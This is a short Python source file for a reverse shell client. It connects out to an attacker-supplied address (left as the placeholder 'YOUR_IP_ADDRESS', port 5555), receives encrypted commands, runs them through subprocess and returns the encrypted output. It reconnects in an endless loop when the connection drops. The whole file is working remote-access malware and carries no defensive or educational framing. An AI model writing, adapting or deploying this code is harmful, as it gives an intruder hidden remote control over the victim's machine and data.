import socket
import subprocess
import os
import time
import shutil
from encryption import encrypt, decrypt

SERVER_IP = "YOUR_IP_ADDRESS"
PORT = 5555

def connect():
    """Connects to the server and waits for commands"""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, PORT))
            print("[+] Connected to server")
            
            while True:
                command = decrypt(client.recv(4096))
                if command.lower() == "exit":
                    break
                output = subprocess.getoutput(command)
                client.send(encrypt(output))
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    connect()
